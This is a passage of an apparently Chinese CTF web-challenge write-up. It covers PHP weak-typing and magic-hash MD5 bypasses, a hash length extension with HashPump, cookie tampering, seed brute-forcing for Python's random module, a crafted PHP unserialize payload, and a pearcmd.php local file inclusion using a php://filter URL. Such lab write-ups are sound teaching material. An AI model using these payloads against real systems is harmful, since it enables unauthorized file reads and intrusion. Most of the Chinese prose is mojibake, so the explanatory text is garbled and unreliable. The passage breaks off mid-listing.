2</h3><blockquote><p><code>$b</code>å‚æ•°éœ€è¦é€šè¿‡<code>POST</code>è·å¾—ï¼Œ<code>postman</code>å¯åŠ¨ï¼ï¼</p><p>è¦æ±‚<code>$b</code>éæ•°å­—ï¼Œä¸”å¤§äº<code>2023</code></p><blockquote><p><code>is_numeric()</code> å‡½æ•°ä¼šåˆ¤æ–­å¦‚æœæ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› <code>TRUE</code>ï¼Œå¦åˆ™è¿”å› <code>FALSE</code>ï¼Œä¸”phpä¸­å¼±ç±»å‹æ¯”è¾ƒæ—¶ï¼Œä¼šä½¿<code>(&#39;2024a&#39; == 2024)</code>ä¸ºçœŸ</p></blockquote><p><em><strong>y0u_h4v3_kn0wn</strong></em></p></blockquote><h3 id="Part-3"><a href="#Part-3" class="headerlink" title="Part 3"></a>Part 3</h3><blockquote><p><code>$c</code>å’Œ<code>$d</code>ä¾ç„¶éœ€è¦<code>POST</code>è¯·æ±‚</p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªMD5ç¢°æ’</p><p><code>==</code>å¼±ç±»å‹æ¯”è¾ƒ</p><p>å°è¯•å¯çŸ¥<code>var_dump(&quot;0e123456&quot;==&quot;0e234567&quot;); //true</code></p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©<code>sha1($c)</code>å’Œ<code>md5($d)</code>ä¸º<code>0e</code>å¼€å¤´ï¼Œåé¢å…¨ä¸ºæ•°å­—å°±è¡Œäº†</p><p>é¡ºä¾¿æŠŠå‰é¢æ¡ä»¶ç»•ä¸€ä¸‹</p><p>å¥½åƒçˆ†ç ´ä¸å‡ºæ¥ï¼Œé‚£ä¸Šç½‘æ‹¿ä¸€ä¸ªå§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">c = <span class="hljs-number">10932435112</span><br>d = QNKCDZO<br></code></pre></td></tr></table></figure><p><em><strong>_s0meth1ng_ab0ut_php</strong></em></p></blockquote><h3 id="Part-4"><a href="#Part-4" class="headerlink" title="Part 4"></a>Part 4</h3><blockquote><blockquote><p><code>strpos()</code>å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°è¯¥å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å› <code>false</code>ã€‚</p><p>å¯ä»¥ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡ã€‚</p></blockquote><p><em><strong>_and_rob0ts.txt!}</strong></em></p></blockquote><p><em><strong><center><font color="#81ecec" size="5">vkctf{1_th1nk_y0u_h4v3_kn0wn_s0meth1ng_ab0ut_php_and_rob0ts.txt!}</font></center></strong></em></p><h2 id="read-file"><a href="#read-file" class="headerlink" title="read_file"></a>read_file</h2><p>æ ¹æ®æç¤ºè®¿é—®<code>/help.txt</code></p><p><img src="/posts/29460/image-20231023001508423.png" alt="image-20231023001508423"></p><p>è®©æˆ‘ä»¬è®¿é—®æ–‡ä»¶</p><p>ä¸€é€šå°è¯•ï¼Œå‘ç°<code>/flag2.txt</code>å¯ä»¥</p><p><img src="/posts/29460/image-20231023001608912.png" alt="image-20231023001608912"></p><p>å¾—åˆ°ç”¨æˆ·åå’Œå¯†ç ï¼Œä¸”æç¤ºæˆ‘ä»¬ç”¨<code>/dict.txt</code></p><p><img src="/posts/29460/image-20231023001657353.png" alt="image-20231023001657353"></p><p>ä»”ç»†seeseeï¼Œå‘ç°ä¸€ä¸ª<code>/admin</code>ï¼Œç‹ ç‹ è®¿é—®ï¼</p><p><code>username = admin</code></p><p><code>password=YWRtaW4xMjM=</code></p><p>å‘ç°ç™»é™†å¤±è´¥ï¼Œå“¦ï¼Œå¿˜è®°ç»™å¯†ç è§£ç äº†ï¼Œä¸€çœ¼base64</p><p>è§£ç å¾—åˆ°<code>admin123</code></p><p><img src="/posts/29460/image-20231023002044581.png" alt="image-20231023002044581"></p><p><strong><del>å¯åŠ¨æˆåŠŸï¼</del>ç™»é™†æˆåŠŸï¼</strong></p><p>æ¥ç€<code>F12</code>å°±å¾—åˆ°flagäº†</p><p><em><strong><center><font color="#81ecec" size="5">viking{hi0t3vJ9obLo8oz8EujZ}</font></center></strong></em></p><h2 id="Hash-attack"><a href="#Hash-attack" class="headerlink" title="Hash_attack"></a>Hash_attack</h2><p><img src="/posts/29460/image-20231024124812566.png" alt="image-20231024124812566"></p><p>å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ï¼ŒåŸç†ä¸å¤ªæ‡‚</p><p>æ‰¾ä¸ªåˆ«äººå†™å¥½çš„æ¥ç”¨ç”¨</p><p>è¿™é‡Œç”¨çš„æ˜¯<code>HashPump</code>ï¼ˆè²Œä¼¼åº“æ²¡äº†</p><p><img src="/posts/29460/image-20231024131137953.png" alt="image-20231024131137953"></p><blockquote><p><code>Signature</code>æ˜¯æç¤ºç»™çš„<code>md5($salt.&quot;vkpass&quot;)</code></p><p><code>Data</code>æ˜¯<code>pass</code>ï¼ˆå› ä¸ºåˆ¤æ–­æ¡ä»¶<code>$password!=&quot;pass&quot;</code></p><p><code>Key Length</code>åˆ™æ˜¯<code>$salt</code>+<code>$username</code>çš„é•¿åº¦</p><p><code>Data to Add</code>å°±éšæ„äº†</p></blockquote><p>å¾—åˆ°ä¸€ä¸²<code>hash</code>å’Œ<code>payload</code></p><p>ç°åœ¨å°±å¾ˆæ¸…æ™°äº†ï¼ˆåº”è¯¥å§</p><p><img src="/posts/29460/image-20231024131735567.png" alt="image-20231024131735567"></p><p>è¿™é‡Œè®°å¾—æŠŠ<code>\x</code>æ›¿æ¢æˆ<code>%</code>ï¼Œå› ä¸ºpostä¸Šå»ä¼šæœ‰<code>urldecode()</code>æ“ä½œ</p><p><img src="/posts/29460/image-20231024131755326.png" alt="image-20231024131755326"></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{1iU_2Hu_Xi_5Mi1}</font></center></strong></em></p><h2 id="å‰‘æ¥"><a href="#å‰‘æ¥" class="headerlink" title="å‰‘æ¥"></a>å‰‘æ¥</h2><p>è®¿é—®é¢˜ç›®ï¼Œ<code>F12</code>æŸ¥çœ‹å¾—çŸ¥ç‚¹å‡»æŒ‰é’®è·³è½¬<code>flag.php</code></p><p><img src="/posts/29460/image-20231023193734369.png" alt="image-20231023193734369"></p><p>ä½†æ˜¯ç‚¹äº†å´ä¸æ˜¯<code>flag.php</code></p><p>å¯çŸ¥æ˜¯<code>302è·³è½¬</code></p><p>ä¸€èˆ¬ç”¨<code>curl</code>çš„æ–¹å¼è®¿é—®<code>flag.php</code></p><p>å¯æƒœ</p><p><img src="/posts/29460/image-20231023193938566.png" alt="image-20231023193938566"></p><p>å‰é¢æ³¨æ„åˆ°<code>script</code>é‡Œä¼šè®¾ç½®<code>cookie</code></p><p><img src="/posts/29460/image-20231023194015312.png" alt="image-20231023194015312"></p><p>æ ¹æ®é¢˜ç›®çŒœæµ‹è¦æŠŠæ”¹æˆ<code>admin=jianlai</code></p><p><img src="/posts/29460/image-20231023194114152.png" alt="image-20231023194114152"></p><p><em><strong><center><font color="#81ecec" size="5">vkctf{ZHi_dao_chEngRen_c8Owu_Jianla1}</font></center></strong></em></p><h2 id="ç­¾æ”¶æ‚¨çš„gift"><a href="#ç­¾æ”¶æ‚¨çš„gift" class="headerlink" title="ç­¾æ”¶æ‚¨çš„gift"></a>ç­¾æ”¶æ‚¨çš„gift</h2><p>è¿™çœŸçš„æ˜¯webå—ï¼ŸğŸ˜–ğŸ˜–ğŸ˜–</p><p><img src="/posts/29460/image-20231024162718448.png" alt="image-20231024162718448"></p><p>å¯ä»¥å‘ç°äºŒç»´ç çš„æ•°æ®è¢«ç¼–ç äº†ï¼Œè§£ç å°±æ˜¯å¯¹åº”çš„äºŒç»´ç å›¾ç‰‡æ•°æ®äº†</p><p>æ¥ç€ï¼Œå†™ä¸ªå°è„šæœ¬ï¼Œæˆ–è€…æ‰¾ä¸ª<strong>å°ç½‘ç«™</strong>ï¼ˆ<a href="https://www.lddgo.net/convert/base64-to-image">åœ¨çº¿Base64è½¬å›¾ç‰‡ (lddgo.net)</a>ï¼‰ï¼Œè½¬æ¢æˆå›¾ç‰‡å°±è¡Œäº†</p><p>æ‰«ç å¯å¾—åä¸ªæ•°å­—</p><p><img src="/posts/29460/image-20231024165708370.png" alt="image-20231024165708370"></p><p>åˆ†æä¸‹<code>generate_qr_code()</code>å‡½æ•°ï¼Œè¿™é‡Œæˆªå‡ºäº†æœ‰ç”¨çš„éƒ¨åˆ†</p><p><img src="/posts/29460/image-20231024163425533.png" alt="image-20231024163425533"></p><p><img src="/posts/29460/image-20231024163937057.png" alt="image-20231024163937057"></p><blockquote><p>ä»1-1000ä¸­éšæœºé€‰æ‹©æ•°å­—ä½œä¸ºç§å­seed</p><p>å¾ªç¯åæ¬¡<code>getrandbits()</code>ï¼Œå¾€revealä¸­å¢åŠ ç”Ÿæˆçš„å­—ç¬¦</p><p>å¾ªç¯ç»“æŸåï¼Œå†è·å–ä¸€æ¬¡<code>getrandbits()</code>ï¼Œå¹¶æŠŠç”Ÿæˆçš„æ•°åº“å¡åˆ°qrcodeé‡Œ</p></blockquote><p>è¿™é‡Œéœ€è¦çŸ¥é“ï¼Œå½“ç§å­å›ºå®šï¼Œ<code>getrandbits()</code>è·å¾—çš„éšæœºæ•°ä¹Ÿç›¸åº”å›ºå®šï¼Œé‚£æˆ‘å°±è·Ÿä½ ä»¬çˆ†äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><br>res = [<span class="hljs-number">6</span>, <span class="hljs-number">252</span>, <span class="hljs-number">12</span>, <span class="hljs-number">137</span>, <span class="hljs-number">124</span>, <span class="hljs-number">102</span>, <span class="hljs-number">108</span>, <span class="hljs-number">201</span>, <span class="hljs-number">187</span>, <span class="hljs-number">200</span>]<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>    reveal = []<br>    random.seed(j)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        reveal.append(random.getrandbits(<span class="hljs-number">8</span>))<br>    target = random.getrandbits(<span class="hljs-number">8</span>)<br>    <span class="hljs-comment"># print(target)</span><br>    <span class="hljs-keyword">if</span> reveal == res:<br>        <span class="hljs-comment"># print(j)</span><br>        <span class="hljs-built_in">print</span>(target)<br>        <span class="hljs-comment"># print(reveal)</span><br><br></code></pre></td></tr></table></figure><p><img src="/posts/29460/image-20231024164806099.png" alt="image-20231024164806099"></p><p><em><strong><center><font color="#81ecec" size="5">viking{m1sc_0r_w2b_0r_crypt0?}</font></center></strong></em></p><h2 id="unserialization"><a href="#unserialization" class="headerlink" title="unserialization"></a>unserialization</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fuck1&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fuck again&quot;</span>;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag1.php&quot;</span>);<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;3&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ä»£ç ï¼š</p><blockquote><ul><li><p><code>is_valid()</code>ç¡®ä¿è¾“å…¥çš„<code>$s</code>çš„å­—ç¬¦ASCIIéœ€è¦åœ¨32-125é—´ï¼Œå¦‚æœç”¨<code>protected</code>åºåˆ—åŒ–ä¼šäº§ç”Ÿ<code>/0/0</code>ä¸å¯è§å­—ç¬¦ï¼Œä¸æ»¡è¶³è¦æ±‚ï¼Œæ‰€ä»¥ä½¿ç”¨<code>public</code></p></li><li><p>ååºåˆ—åŒ–æ—¶ä¸ä¼šè°ƒç”¨<code>__construct()</code>ï¼Œä½†åœ¨ç±»å³å°†æ‘§æ¯æ—¶ï¼Œä¼šè°ƒç”¨<code>__destruct()</code>ï¼Œå³è°ƒç”¨<code>process()</code>å‡½æ•°</p></li><li><p>åœ¨<code>process()</code>ä¸­åªæœ‰<code>op=2</code>æ—¶ï¼Œæ‰èƒ½è¯»<code>flag.php</code></p></li></ul><p>æ‰€ä»¥å†™payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;2&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> =<span class="hljs-string">&quot;wHy 1S YuAnsHen&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:1:&quot;2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:15:&quot;wHy 1S YuAnsHen&quot;;&#125;</code></p></blockquote><p><em><strong><center><font color="#81ecec" size="5">viking{BUNmH4MHP3dZf9mkdesj}</font></center></strong></em></p><h2 id="å¬è¯´ä½ ä¼šLFI"><a href="#å¬è¯´ä½ ä¼šLFI" class="headerlink" title="å¬è¯´ä½ ä¼šLFI"></a>å¬è¯´ä½ ä¼šLFI</h2><p>æç¤º<code>./phpinfo.php</code></p><p><img src="/posts/29460/image-20231026125819460.png" alt="image-20231026125819460"></p><p>ç½‘ä¸Šæœåˆ°ä½¿ç”¨<code>pearcmd</code>çš„è§£æ³•<a href="https://blog.csdn.net/Mrs_H/article/details/122386511">åˆ©ç”¨pearcmd.phpæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰-CSDNåšå®¢</a></p><blockquote><p>åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬éœ€è¦ç¡®å®šå‡ ä»¶äº‹æƒ…ï¼š</p><p>1.æˆ‘ä»¬è¦æ‰¾åˆ°<code>pearcmd.php</code>çš„æ–‡ä»¶ä½ç½®ã€‚æ­£å¸¸æƒ…å†µä¸‹åœ¨<code>/usr/local/lib/php/pearcmd.php</code></p><p>2.æˆ‘ä»¬è¦å¼€å¯<code>register_argc_argv</code>é€‰é¡¹ï¼Œå½“ç„¶äº†dockerçš„PHPé•œåƒæ˜¯é»˜è®¤å¼€å¯çš„ã€‚</p><p>å½“æˆ‘ä»¬å¼€å¯register_argc_argvé€‰é¡¹çš„æ—¶å€™ï¼Œ$_SERVER[â€˜argvâ€™]å°±ä¼šç”Ÿæ•ˆã€‚</p></blockquote><p>è®¿é—®<code>?file=php://filter/read=convert.base64-encode/resource=/usr/local/lib/php/pearcmd.php</code></p><p>è§£ç å¯ä»¥å¾—åˆ°</p><details>    <summary><strong>ç‚¹å‡»æŸ¥çœ‹</strong></summary><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span 